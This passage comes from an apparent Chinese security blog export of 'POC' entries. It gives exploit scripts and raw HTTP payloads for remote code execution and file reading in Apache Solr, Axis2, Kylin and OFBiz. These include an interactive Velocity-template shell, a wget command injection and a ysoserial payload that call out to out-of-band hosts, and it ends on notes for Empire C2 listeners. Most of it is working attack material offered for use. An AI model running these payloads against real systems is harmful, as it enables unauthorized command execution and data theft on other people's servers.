&#x2F;&gt;</span><br><span class="line">                        &lt;field column&#x3D;&quot;title&quot;        xpath&#x3D;&quot;&#x2F;RDF&#x2F;item&#x2F;title&quot; &#x2F;&gt;</span><br><span class="line">                        &lt;field column&#x3D;&quot;link&quot;         xpath&#x3D;&quot;&#x2F;RDF&#x2F;item&#x2F;link&quot; &#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;entity&gt;</span><br><span class="line">        &lt;&#x2F;document&gt;</span><br><span class="line">&lt;&#x2F;dataConfig&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST &#x2F;solr&#x2F;&lt;your_core_name&gt;&#x2F;dataimport HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8983</span><br><span class="line">Content-Length: 763</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0</span><br><span class="line">Content-type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">command&#x3D;full-import&amp;verbose&#x3D;false&amp;clean&#x3D;false&amp;commit&#x3D;true&amp;debug&#x3D;true&amp;core&#x3D;&lt;your_core_name&gt;&amp;name&#x3D;dataimport&amp;dataConfig&#x3D;</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">&lt;dataSource type&#x3D;&quot;URLDataSource&quot;&#x2F;&gt;</span><br><span class="line">&lt;script&gt;&lt;![CDATA[</span><br><span class="line">function poc(row)&#123;</span><br><span class="line">var process&#x3D; java.lang.Runtime.getRuntime();</span><br><span class="line">process.exec(&quot;calc&quot;);</span><br><span class="line">return row;</span><br><span class="line">&#125;</span><br><span class="line">]]&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;document&gt;</span><br><span class="line">&lt;entity name&#x3D;&quot;stackoverflow&quot;</span><br><span class="line">url&#x3D;&quot;https:&#x2F;&#x2F;stackoverflow.com&#x2F;feeds&#x2F;tag&#x2F;solr&quot;</span><br><span class="line">processor&#x3D;&quot;XPathEntityProcessor&quot;</span><br><span class="line">forEach&#x3D;&quot;&#x2F;feed&quot;</span><br><span class="line">transformer&#x3D;&quot;script:poc&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;document&gt;</span><br></pre></td></tr></table></figure>
<p>工具：cve-2019-0193_cmd.py</p>
<h1 id="CVE-2019-12409-LINUX-RCE"><a href="#CVE-2019-12409-LINUX-RCE" class="headerlink" title="CVE-2019-12409-LINUX-RCE"></a>CVE-2019-12409-LINUX-RCE</h1><p>APACHE SOLR 8.1.1/8.2.0</p>
<p>Apache Solr的8.1.1和8.2.0发行版中的默认配置文件solr.in.sh,在其配置文件中ENABLE_REMOTE_JMX_OPTS字段默认配置不安全.如果使用受影响版本中的默认配置,那么将启用JMX监视服务并将对公网监听一个18983的RMI端口,且无需进行任何身份验证,配合JMX RMI将会导致远程代码执行。</p>
<p>直接msf的jmx打18983</p>
<h1 id="CVE-2019-17558-RCE"><a href="#CVE-2019-17558-RCE" class="headerlink" title="CVE-2019-17558-RCE"></a>CVE-2019-17558-RCE</h1><p>Apache Solr 5.x到8.2.0版本-RCE</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line"># author:zhzyker</span><br><span class="line"># from:https:&#x2F;&#x2F;github.com&#x2F;zhzyker&#x2F;exphub</span><br><span class="line"># telegram:t.me&#x2F;zhzyker</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!&#x3D;2:</span><br><span class="line">    print(&#39;+------------------------------------------------------------+&#39;)</span><br><span class="line">    print(&#39;+ DES: by zhzyker as https:&#x2F;&#x2F;github.com&#x2F;zhzyker&#x2F;exphub       +&#39;)</span><br><span class="line">    print(&#39;+      Apache Solr Velocity Commons Remote Code Execution    +&#39;)</span><br><span class="line">    print(&#39;+------------------------------------------------------------+&#39;)</span><br><span class="line">    print(&#39;+ USE: python3 cve-2019-17558_cmd.py &lt;url&gt;                   +&#39;)</span><br><span class="line">    print(&#39;+ EXP: python3 cve-2019-17558_cmd.py http:&#x2F;&#x2F;1.1.1.1:8983     +&#39;)</span><br><span class="line">    print(&#39;+ VER: Apache Solr 5.0.0 - 8.3.1                             +&#39;)</span><br><span class="line">    print(&#39;+------------------------------------------------------------+&#39;)</span><br><span class="line">    sys.exit(0)</span><br><span class="line">    </span><br><span class="line">url &#x3D; sys.argv[1]</span><br><span class="line"></span><br><span class="line">core_url &#x3D; url + &quot;&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json&quot;</span><br><span class="line">try:</span><br><span class="line">    r &#x3D; requests.request(&quot;GET&quot;, url&#x3D;core_url, timeout&#x3D;10)</span><br><span class="line">    core_name &#x3D; list(json.loads(r.text)[&quot;status&quot;])[0]</span><br><span class="line">    print (&quot;[+] GET API: &quot;+url+&quot;&#x2F;solr&#x2F;&quot;+core_name+&quot;&#x2F;config&quot;)</span><br><span class="line">except:</span><br><span class="line">    print (&quot;[-] Target Not Vuln Good Luck&quot;)</span><br><span class="line">    sys.exit(0)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">api_url &#x3D; url + &quot;&#x2F;solr&#x2F;&quot; +core_name+ &quot;&#x2F;config&quot;</span><br><span class="line">headers &#x3D; &#123;&quot;Content-Type&quot;: &quot;application&#x2F;json&quot;&#125;</span><br><span class="line">set_api_data &#x3D;&quot;&quot;&quot;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">api &#x3D; requests.request(&quot;POST&quot;, url&#x3D;api_url, data&#x3D;set_api_data, headers&#x3D;headers)</span><br><span class="line">code &#x3D; str(api.status_code)</span><br><span class="line">if api.status_code &#x3D;&#x3D; 200:</span><br><span class="line">    print (&quot;[+] &lt;HTTP&quot; +code+ &quot;&gt; SET API Success&quot;)</span><br><span class="line">else:</span><br><span class="line">    print (&quot;[-] &lt;HTTP&quot; +code+ &quot;&gt; SET API Failed Good Luck&quot;)</span><br><span class="line">    sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def do_exp(cmd):</span><br><span class="line">    vuln_url &#x3D; url+&quot;&#x2F;solr&#x2F;&quot;+core_name+&quot;&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27&quot;+cmd+&quot;%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&quot;</span><br><span class="line">    r &#x3D; requests.request(&quot;GET&quot;, vuln_url)</span><br><span class="line">    print (r.text)</span><br><span class="line"></span><br><span class="line">while 1:</span><br><span class="line">    cmd &#x3D; input(&quot;Shell &gt;&gt;&gt; &quot;)</span><br><span class="line">    if cmd &#x3D;&#x3D; &quot;exit&quot; : exit(0)</span><br><span class="line">    do_exp(cmd)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>工具：cve-2019-17558_cmd.py</p>
<h1 id="CVE-2020-13957-文件上传-RCE"><a href="#CVE-2020-13957-文件上传-RCE" class="headerlink" title="CVE-2020-13957-文件上传-RCE"></a>CVE-2020-13957-文件上传-RCE</h1><p>solr没法解析，通过上传有漏洞的配置文件达成RCE</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Apache Solr 6.6.0 -6.6.5</span><br><span class="line"></span><br><span class="line">Apache Solr 7.0.0 -7.7.3</span><br><span class="line"></span><br><span class="line">Apache Solr 8.0.0 -8.6.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">不同版本需要不同的conf</span><br><span class="line"></span><br><span class="line">只有在开启了solr cloud的情况下才能进行上传</span><br><span class="line"></span><br><span class="line">\server\solr\configsets\_default\conf目录下的solrconfig.xml文件中params.resource.loader.enabled的值设置为true(为远程命令执行做准备)，conf目录下所有文件打包成一个压缩文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1、上传自定义配置</span><br><span class="line">POST &#x2F;solr&#x2F;admin&#x2F;configs?action&#x3D;UPLOAD&amp;name&#x3D;file11 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.156.1:8983</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.156.1:8983&#x2F;solr&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh;q&#x3D;0.9,zh-CN;q&#x3D;0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type:application&#x2F;octet-stream</span><br><span class="line">Content-Length: 75398</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2、根据baseConfigSet配置，创建新配置</span><br><span class="line">GET &#x2F;solr&#x2F;admin&#x2F;configs?action&#x3D;CREATE&amp;name&#x3D;file33&amp;baseConfigSet&#x3D;file11&amp;configSetProp.immutable&#x3D;false&amp;wt&#x3D;xml&amp;omitHeader&#x3D;true HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.156.1:8983</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.156.1:8983&#x2F;solr&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh;q&#x3D;0.9,zh-CN;q&#x3D;0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3、根据创建的新配置，创建Collection</span><br><span class="line">GET &#x2F;solr&#x2F;admin&#x2F;collections?action&#x3D;CREATE&amp;numShards&#x3D;1&amp;name&#x3D;file22&amp;collection.configName&#x3D;file33 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.156.1:8983</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.156.1:8983&#x2F;solr&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh;q&#x3D;0.9,zh-CN;q&#x3D;0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4、利用cve-2019-17558进行RCE</span><br><span class="line">GET &#x2F;solr&#x2F;file22&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;&#39;&#39;)+%23set($rt&#x3D;$x.class.forName(&#39;java.lang.Runtime&#39;))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27systeminfo%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.156.1:8983</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.156.1:8983&#x2F;solr&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh;q&#x3D;0.9,zh-CN;q&#x3D;0.8</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
<h1 id="2021任意文件读取"><a href="#2021任意文件读取" class="headerlink" title="2021任意文件读取"></a>2021任意文件读取</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line">import time</span><br><span class="line">from lxml import etree</span><br><span class="line">import json</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">def title():</span><br><span class="line">    print(&#39;+------------------------------------------&#39;)</span><br><span class="line">    print(&#39;+  \033[34mPOC_Des: http:&#x2F;&#x2F;wiki.peiqi.tech           \033[0m&#39;)</span><br><span class="line">    print(&#39;+  \033[34mGithub : https:&#x2F;&#x2F;github.com&#x2F;PeiQi0        \033[0m&#39;)</span><br><span class="line">    print(&#39;+  \033[34m公众号  : PeiQi文库                        \033[0m&#39;)</span><br><span class="line">    print(&#39;+  \033[34mVersion: Apache Solr &lt; 8.8.1            \033[0m&#39;)</span><br><span class="line">    print(&#39;+  \033[36m使用格式: python3 poc.py               \033[0m&#39;)</span><br><span class="line">    print(&#39;+  \033[36mUrl    &gt;&gt;&gt; http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8983  \033[0m&#39;)</span><br><span class="line">    print(&#39;+  \033[36mFile   &gt;&gt;&gt; 文件名称或目录                  \033[0m&#39;)</span><br><span class="line">    print(&#39;+------------------------------------------&#39;)</span><br><span class="line"></span><br><span class="line">def POC_1(target_url):</span><br><span class="line">    core_url &#x3D; target_url + &quot;&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json&quot;</span><br><span class="line">    try:</span><br><span class="line">        response &#x3D; requests.request(&quot;GET&quot;, url&#x3D;core_url, timeout&#x3D;10)</span><br><span class="line">        core_name &#x3D; list(json.loads(response.text)[&quot;status&quot;])[0]</span><br><span class="line">        print(&quot;\033[32m[o] 成功获得core_name,Url为：&quot; + target_url + &quot;&#x2F;solr&#x2F;&quot; + core_name + &quot;&#x2F;config\033[0m&quot;)</span><br><span class="line">        return core_name</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;\033[31m[x] 目标Url漏洞利用失败\033[0m&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">def POC_2(target_url, core_name):</span><br><span class="line">    vuln_url &#x3D; target_url + &quot;&#x2F;solr&#x2F;&quot; + core_name + &quot;&#x2F;config&quot;</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &quot;Content-type&quot;:&quot;application&#x2F;json&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    data &#x3D; &#39;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#39;</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response &#x3D; requests.post(url&#x3D;vuln_url, data&#x3D;data, headers&#x3D;headers, verify&#x3D;False, timeout&#x3D;5)</span><br><span class="line">        print(&quot;\033[36m[o] 正在准备文件读取...... \033[0m&quot;.format(target_url))</span><br><span class="line">        if &quot;This&quot; in response.text and response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">            print(&quot;\033[32m[o] 目标 &#123;&#125; 可能存在漏洞 \033[0m&quot;.format(target_url))</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;\033[31m[x] 目标 &#123;&#125; 不存在漏洞\033[0m&quot;.format(target_url))</span><br><span class="line">            sys.exit(0)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 请求失败 \033[0m&quot;, e)</span><br><span class="line"></span><br><span class="line">def POC_3(target_url, core_name, File_name):</span><br><span class="line">    vuln_url &#x3D; target_url + &quot;&#x2F;solr&#x2F;&#123;&#125;&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams&quot;.format(core_name)</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    data &#x3D; &#39;stream.url&#x3D;file:&#x2F;&#x2F;&#123;&#125;&#39;.format(File_name)</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response &#x3D; requests.post(url&#x3D;vuln_url, data&#x3D;data, headers&#x3D;headers, verify&#x3D;False, timeout&#x3D;5)</span><br><span class="line">        if &quot;No such file or directory&quot; in response.text:</span><br><span class="line">            print(&quot;\033[31m[x] 读取&#123;&#125;失败 \033[0m&quot;.format(File_name))</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;\033[36m[o] 响应为:\n&#123;&#125; \033[0m&quot;.format(json.loads(response.text)[&quot;streams&quot;][0][&quot;stream&quot;]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 请求失败 \033[0m&quot;, e)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    title()</span><br><span class="line">    target_url &#x3D; str(input(&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">    core_name &#x3D; POC_1(target_url)</span><br><span class="line">    POC_2(target_url, core_name)</span><br><span class="line">    while True:</span><br><span class="line">        File_name &#x3D; str(input(&quot;\033[35mFile &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">        POC_3(target_url, core_name, File_name)</span><br></pre></td></tr></table></figure>
<p>工具：solr-fr.py</p>
]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>Apache-Solr</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache-axis2</title>
    <url>/2021/04/13/Apache-axis2/</url>
    <content><![CDATA[<p>Axis2是继Axis后由Apache公司推出的新的Web Service模型。<a id="more"></a></p>
<h1 id="后台Getshell"><a href="#后台Getshell" class="headerlink" title="后台Getshell"></a>后台Getshell</h1><p>路径：admin/axis2</p>
<p>长这样，网上找的图。</p>
<p><img src="./images/axis2-show.png" alt="axis2-show"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 命令执行</span><br><span class="line">http:&#x2F;&#x2F;192.168.56.103:8080&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;exec?cmd&#x3D;dir%20C:</span><br><span class="line"></span><br><span class="line">- 写文件</span><br><span class="line"></span><br><span class="line">  http:&#x2F;&#x2F;192.168.56.103:8080&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;write?path&#x3D;c:\1.1txt&amp;content&#x3D;123</span><br><span class="line"></span><br><span class="line">- 信息</span><br><span class="line"></span><br><span class="line">  http:&#x2F;&#x2F;192.168.56.103:8080&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;info</span><br><span class="line"></span><br><span class="line">- 读文件</span><br><span class="line"></span><br><span class="line">  http:&#x2F;&#x2F;192.168.56.103:8080&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;read?path&#x3D;c:\boot.ini</span><br><span class="line"></span><br><span class="line">- 下载</span><br><span class="line"></span><br><span class="line">  http:&#x2F;&#x2F;192.168.56.103:8080&#x2F;axis2&#x2F;services&#x2F;AxisInvoker&#x2F;download?url&#x3D;http:&#x2F;&#x2F;www.baidu.com&amp;file&#x3D;c:\122.txt</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>Apache-axis2</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache-kylin</title>
    <url>/2021/04/13/Apache-kylin/</url>
    <content><![CDATA[<p>Apache Kylin 是一个开源的分布式的 OLAP 分析引擎<a id="more"></a></p>
<p>长这样</p>
<p><img src="./images/kylin-show.png" alt="kylin-show"></p>
<h1 id="CVE-2020-13925-RCE"><a href="#CVE-2020-13925-RCE" class="headerlink" title="CVE-2020-13925-RCE"></a>CVE-2020-13925-RCE</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">影响版本</span><br><span class="line">2.3.0, 2.3.1, 2.3.2,</span><br><span class="line">2.4.0, 2.4.1,</span><br><span class="line">2.5.0, 2.5.1, 2.5.2,</span><br><span class="line">2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6,</span><br><span class="line">3.0.0-alpha, 3.0.0-alpha2,3.0.0-beta, 3.0.0, 3.0.1 3.0.2</span><br><span class="line">Users of all previous versions after 2.3 should upgrade to 3.1.0.  即修复版本为: 3.1.0。</span><br><span class="line"></span><br><span class="line">GET &#x2F;kylin&#x2F;api&#x2F;diag&#x2F;project&#x2F;%7c%7cwget%20kylin.6eb4yw.ceye.io%7c%7c&#x2F;download HTTP&#x2F;1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;114.116.246.194:7070&#x2F;kylin&#x2F;admin</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh;q&#x3D;0.9,zh-CN;q&#x3D;0.8</span><br><span class="line">Cookie: project&#x3D;%22hx_test%22; JSESSIONID&#x3D;9A1CA904C78F54746112592BCF0D6E7B</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">流程：</span><br><span class="line">http:&#x2F;&#x2F;host:7070&#x2F;kylin&#x2F;login 初始用户名和密码是 ADMIN&#x2F;KYLIN</span><br><span class="line"></span><br><span class="line">登录系统后，访问 System--&gt;Configuration--&gt;Diagnosis。触发下载诊断信息的请求。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;host:port&#x2F;kylin&#x2F;api&#x2F;diag&#x2F;project&#x2F;learn_kylin&#x2F;download</span><br><span class="line">image.png</span><br><span class="line"></span><br><span class="line">在burp的repeater中修改原始请求，即将项目名称“learn_kylin”替换为如上payload访问即可。</span><br><span class="line"></span><br><span class="line">||wget h1j96qoac5o9mbqpkewkhxxa218rwg.burpcollaborator.net||</span><br><span class="line">URL编码后：</span><br><span class="line">%7c%7cwget%20h1j96qoac5o9mbqpkewkhxxa218rwg.burpcollaborator.net%7c%7c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">漏洞验证PoC</span><br><span class="line">原始请求：</span><br><span class="line">http:&#x2F;&#x2F;host:port&#x2F;kylin&#x2F;api&#x2F;diag&#x2F;project&#x2F;learn_kylin&#x2F;download</span><br><span class="line"></span><br><span class="line">PoC请求，GET方法：</span><br><span class="line">http:&#x2F;&#x2F;host:port&#x2F;kylin&#x2F;api&#x2F;diag&#x2F;project&#x2F;%7c%7cwget%20h1j96qoac5o9mbqpkewkhxxa218rwg.burpcollaborator.net%7c%7c&#x2F;download</span><br><span class="line"></span><br><span class="line">即将项目名称“learn_kylin”替换为如下payload：</span><br><span class="line">%7c%7cwget%206eb4yw.ceye.io%7c%7c</span><br><span class="line"></span><br><span class="line">并将||和空格进行URL编码</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-13937-未授权访问"><a href="#CVE-2020-13937-未授权访问" class="headerlink" title="CVE-2020-13937-未授权访问"></a>CVE-2020-13937-未授权访问</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xx.com&#x2F;kylin&#x2F;api&#x2F;admin&#x2F;config</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>Apache-kylin</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache-ofbiz</title>
    <url>/2021/04/13/Apache-ofbiz/</url>
    <content><![CDATA[<p><em>Apache</em> <em>OFBiz</em> 是用于企业流程自动化的开源产品,包括框架组件和业务应用程序。<a id="more"></a></p>
<h1 id="CVE-2020-9496-RCE"><a href="#CVE-2020-9496-RCE" class="headerlink" title="CVE-2020-9496-RCE"></a>CVE-2020-9496-RCE</h1><p>xml反序列化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;webtools&#x2F;control&#x2F;xmlrpc HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8443</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 643</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">	&lt;methodCall&gt;</span><br><span class="line">		&lt;methodName&gt;ProjectDiscovery&lt;&#x2F;methodName&gt;</span><br><span class="line">			&lt;params&gt;</span><br><span class="line">				&lt;param&gt;</span><br><span class="line">					&lt;value&gt;</span><br><span class="line">						&lt;struct&gt;</span><br><span class="line">							&lt;member&gt;</span><br><span class="line">								&lt;name&gt;test&lt;&#x2F;name&gt;</span><br><span class="line">									&lt;value&gt;</span><br><span class="line">										&lt;serializable xmlns&#x3D;&quot;http:&#x2F;&#x2F;ws.apache.org&#x2F;xmlrpc&#x2F;namespaces&#x2F;extensions&quot;&gt;[base64-payload]&lt;&#x2F;serializable&gt;</span><br><span class="line">									&lt;&#x2F;value&gt;</span><br><span class="line">							&lt;&#x2F;member&gt;</span><br><span class="line">						&lt;&#x2F;struct&gt;</span><br><span class="line">					&lt;&#x2F;value&gt;</span><br><span class="line">				&lt;&#x2F;param&gt;</span><br><span class="line">			&lt;&#x2F;params&gt;</span><br><span class="line">&lt;&#x2F;methodCall&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar  CommonsBeanutils1   &quot;curl http:&#x2F;&#x2F;RCE.bgkjco.dnslog.cn&quot; | base64 |  tr -d &#39;\n&#39;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>Apache-ofbiz</tag>
      </tags>
  </entry>
  <entry>
    <title>Empire指南</title>
    <url>/2021/04/12/Empire%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>不废话<a id="more"></a></p>
<h1 id="开启监听"><a href="#开启监听" class="headerlink" title="开启监听"></a>开启监听</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(Empire) &gt; listeners</span><br><span class="line">(Empire: listeners) &gt; uselistener</span><br><span class="line">dbx		Dropbox的监听</span><br><span class="line">http	http监听【常用】</span><br><span class="line">http_com	https监听，需要指定证书</span><br><span class="line">http_foreign    派生类监听，用于接收给别的派生【跟cs的兼容性不太好】</span><br><span class="line">http_hop        用于监听器的跳转</span><br><span class="line">http_malleable  自定义C2</span><br><span class="line">http_mapi       暂未研究</span><br><span class="line">meterpreter     用于派生给msf？</span><br><span class="line">onedrive        onedrive监听器</span><br><span class="line">redirector		重定向？</span><br></pre></td></tr></table></figure>
<p>有10种可选，常用的基本就是http</p>
